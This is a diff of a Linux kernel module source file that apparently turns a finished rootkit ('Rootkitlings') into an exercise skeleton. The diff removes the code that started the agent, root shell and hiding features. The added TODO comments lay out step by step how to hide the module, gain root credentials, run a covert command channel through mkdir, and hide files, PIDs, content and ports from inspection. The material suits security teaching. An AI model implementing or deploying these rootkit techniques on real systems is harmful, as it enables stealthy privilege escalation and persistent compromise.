@@ -1,185 +1,135 @@
 // SPDX-License-Identifier: GPL-2.0
+#include <linux/cred.h>
 #include <linux/err.h>
 #include <linux/errno.h>
 #include <linux/init.h>
+#include <linux/kprobes.h>
 #include <linux/module.h>
+#include <linux/pid.h>
+#include <linux/proc_fs.h>
+#include <linux/ptrace.h>
+#include <linux/hex.h>
+#include <linux/sched.h>
+#include <linux/sched/task.h>
+#include <linux/seq_file.h>
 #include <linux/string.h>
+#include <linux/uaccess.h>
+#include <net/inet_sock.h>
+#include <net/sock.h>
 
-#include "aead.h"
 #include "agent.h"
-#include "agent_status.h"
 #include "ipv4.h"
-#include "platform.h"
-#include "provision.h"
 #include "root_shell.h"
-#include "rootkit.h"
-#include "transaction.h"
-#include "visibility.h"
+#include "target_list.h"
 
-#if ROOTKITLINGS_FAIL_POINT < 0 || ROOTKITLINGS_FAIL_POINT > 13
-#error "unknown ROOTKITLINGS_FAIL_POINT"
-#endif
+#define RK_BUF_MAX 2048
+#define RK_CMD_MAX 128
+#define RK_PREFIX "rkling."
+#define RK_PREFIX_LEN 7
+#define RK_PATH_MAX 128
 
 static unsigned short peer_port;
 module_param(peer_port, ushort, 0400);
-MODULE_PARM_DESC(peer_port, "control TCP listener port");
 
 static char peer_address_text[16] = "127.0.0.1";
 module_param_string(peer_address, peer_address_text,
 		    sizeof(peer_address_text), 0400);
-MODULE_PARM_DESC(peer_address, "control and shell IPv4 peer address");
 
 static unsigned int retry_base_ms = 25;
 module_param(retry_base_ms, uint, 0400);
-MODULE_PARM_DESC(retry_base_ms, "initial reconnect delay in milliseconds");
 
 static unsigned int retry_max_ms = 200;
 module_param(retry_max_ms, uint, 0400);
-MODULE_PARM_DESC(retry_max_ms, "maximum reconnect delay in milliseconds");
 
 static unsigned int shell_timeout_ms = 60000;
 module_param(shell_timeout_ms, uint, 0400);
-MODULE_PARM_DESC(shell_timeout_ms, "root-shell lifetime in milliseconds");
 
-static char control_key_hex[RK_AEAD_KEY_LENGTH * 2 + 1];
-module_param_string(control_key, control_key_hex,
-		    sizeof(control_key_hex), 0000);
-MODULE_PARM_DESC(control_key, "64 hexadecimal control-key digits");
+static char control_key[65];
+module_param_string(control_key, control_key, sizeof(control_key), 0400);
 
-static struct rk_state *state;
 static struct rk_agent agent;
-static struct rk_root_shell root_shell;
-static struct rk_transaction transaction;
+static struct rk_root_shell shell;
+struct rk_target_list file_targets;
+struct rk_target_list pid_targets;
+struct rk_target_list content_targets;
+struct rk_target_list port_targets;
+static struct proc_dir_entry *proc_entry;
+static struct list_head *saved_prev;
+static bool cloaked;
+static bool persist_requested;
 
-static int __init rk_init(void)
-{
-	u8 control_key[RK_AEAD_KEY_LENGTH] = { };
-	__be32 peer_address;
-	int error;
+// TODO: Implement module cloaking (M01)
+// rk_module_cloak(): list_del(&THIS_MODULE->list), save prev
+// rk_module_uncloak(): list_add(&THIS_MODULE->list, saved_prev)
 
-	error = rk_control_key_parse_and_clear(
-		control_key_hex, sizeof(control_key_hex), control_key);
-	if (error)
-		return error;
-	error = rk_ipv4_parse(peer_address_text, &peer_address);
-	if (error || !peer_port || !retry_base_ms ||
-	    retry_base_ms > retry_max_ms || retry_max_ms > 5000) {
-		error = -EINVAL;
-		goto clear_key;
-	}
-	if (ROOTKITLINGS_FAIL_POINT == RK_FAIL_PREFLIGHT) {
-		error = -ECANCELED;
-		goto clear_key;
-	}
-	state = rk_state_create();
-	if (IS_ERR(state)) {
-		error = PTR_ERR(state);
-		state = NULL;
-		goto clear_key;
-	}
+// TODO: Implement rk_escalate_self()
+// prepare_kernel_cred(&init_task) + commit_creds for calling task
 
-	rk_events_reset();
-	error = rk_worker_start(state);
-	if (error)
-		goto destroy_state;
-	error = rk_authorization_start();
-	if (error)
-		goto stop_worker;
-	error = rk_return_probe_start(state);
-	if (error)
-		goto stop_authorization;
-	error = rk_platform_prepare();
-	if (error)
-		goto stop_return_probe;
-	error = rk_transaction_apply(&transaction);
-	if (error)
-		goto finish_platform;
-	error = rk_root_shell_init(&root_shell, shell_timeout_ms);
-	if (error)
-		goto restore_transaction;
-	if (ROOTKITLINGS_FAIL_POINT == RK_FAIL_AGENT_WORKER)
-		error = -EINTR;
-	else
-		error = rk_agent_start(&agent, peer_address, peer_port,
-				       retry_base_ms, retry_max_ms,
-				       control_key, sizeof(control_key), state,
-				       &root_shell);
-	memzero_explicit(control_key, sizeof(control_key));
-	if (error)
-		goto stop_root_shell;
-	error = rk_visibility_start(state, agent.task);
-	if (error)
-		goto stop_agent;
-	error = rk_events_publish();
-	if (error)
-		goto stop_visibility;
-	error = rk_evidence_publish();
-	if (error)
-		goto unpublish_events;
-	error = rk_agent_status_publish(&agent, &transaction);
-	if (error)
-		goto unpublish_evidence;
-	error = rk_proc_publish(state);
-	if (error)
-		goto unpublish_agent_status;
+// TODO: Implement rk_escalate_pid(unsigned int pid)
+// find_task_by_vpid under rcu_read_lock, get_task_struct,
+// prepare_kernel_cred(&init_task), replace task->real_cred and task->cred
+// Note: find_task_by_vpid is not exported; resolve it at init via kprobe
 
-	rk_scheduler_start(state);
-	rk_agent_enable_commands(&agent);
-	return 0;
+// TODO: Implement rk_parse_local_command(path)
+// Dispatch on command after "rkling." prefix:
+//   "e"           -> rk_escalate_self()
+//   "h.m"         -> rk_module_cloak()
+//   "u.m"         -> rk_module_uncloak()
+//   "persist"     -> set persist_requested
+//   "h.f.VALUE"   -> rk_target_add(&file_targets, VALUE)
+//   "h.i.VALUE"   -> rk_target_add(&pid_targets, VALUE)
+//   "h.c.VALUE"   -> rk_target_add(&content_targets, VALUE)
+//   "h.p.VALUE"   -> rk_target_add(&port_targets, VALUE)
+//   "u.f.N"       -> rk_target_remove(&file_targets, N, ...)
+//   "u.i.N"       -> rk_target_remove(&pid_targets, N, ...)
+//   "u.c.N"       -> rk_target_remove(&content_targets, N, ...)
+//   "u.p.N"       -> rk_target_remove(&port_targets, N, ...)
+//   else          -> return -ENOENT
 
-unpublish_agent_status:
-	rk_agent_status_unpublish();
-unpublish_evidence:
-	rk_evidence_unpublish();
-unpublish_events:
-	rk_events_unpublish();
-stop_visibility:
-	rk_visibility_stop();
-stop_agent:
-	rk_agent_stop(&agent);
-stop_root_shell:
-	rk_root_shell_stop(&root_shell);
-restore_transaction:
-	(void)rk_transaction_restore(&transaction);
-	rk_transaction_dispose(&transaction);
-finish_platform:
-	rk_platform_finish();
-stop_return_probe:
-	rk_return_probe_stop();
-stop_authorization:
-	rk_authorization_stop();
-stop_worker:
-	rk_worker_stop();
-destroy_state:
-	rk_state_destroy(state);
-	state = NULL;
-clear_key:
-	memzero_explicit(control_key, sizeof(control_key));
-	return error;
-}
+// TODO: Implement mkdir interception (M02)
+// kretprobe on __x64_sys_mkdir
+// Entry: get inner pt_regs from arg 0, read user pathname from uregs->di,
+//   strncpy_from_user, check "rkling." prefix, dispatch to rk_parse_local_command,
+//   null out pathname to suppress real mkdir
+// Return: if intercepted, override return value with command result
 
-static void __exit rk_exit(void)
-{
-	rk_agent_stop(&agent);
-	rk_root_shell_stop(&root_shell);
-	rk_scheduler_stop();
-	rk_proc_unpublish();
-	rk_agent_status_unpublish();
-	rk_evidence_unpublish();
-	rk_events_unpublish();
-	rk_visibility_stop();
-	(void)rk_transaction_restore(&transaction);
-	rk_transaction_dispose(&transaction);
-	rk_platform_finish();
-	rk_return_probe_stop();
-	rk_authorization_stop();
-	rk_worker_stop();
-	rk_state_destroy(state);
-	state = NULL;
-}
+// TODO: Implement directory/PID hiding (M03)
+// kretprobe on __x64_sys_getdents64
+// Entry: capture dirp from args
+// Return: copy buffer, filter dirents using rk_target_prefix_match
+//   and rk_target_number_match, copy back, adjust return value
 
-module_init(rk_init);
-module_exit(rk_exit);
+// TODO: Implement content hiding (M06)
+// kretprobe on vfs_read
+// Return: scan buffer line by line, remove lines matching
+//   rk_target_substring_match(&content_targets, ...)
+
+// TODO: Implement port hiding (M06)
+// kretprobe on tcp4_seq_show
+// Entry: check inet_sport against port_targets, save seq and seq->count
+// Return: rewind seq->count to hide matching entries
+
+// TODO: Implement proc interface at /proc/rkling_status
+// Read: show cloaked state and all four target lists
+// (The proc interface is read-only; commands come via agent or mkdir)
+
+// TODO: Implement hex key parser
+
+// TODO: Implement rk_init()
+// 1. Parse key, peer address, validate params
+// 2. Init all four target lists
+// 3. Init root shell, start agent
+// 4. Register getdents64 kretprobe
+// 5. Register vfs_read kretprobe
+// 6. Register tcp4_seq_show kretprobe
+// 7. Register mkdir kprobe
+// 8. Create /proc/rkling_status (0400, read-only)
+// 9. Auto-stealth: rk_target_add(&file_targets, "rkling")
+// Clean up in reverse order on failure
+
+// TODO: Implement rk_exit()
+// Uncloak module, remove proc, unregister all probes (incl mkdir),
+// stop agent, stop shell, zeroize key
 
 MODULE_LICENSE("GPL");
-MODULE_DESCRIPTION("Rootkitlings complete rootkit starter");
+MODULE_DESCRIPTION("Rootkitlings complete rootkit");
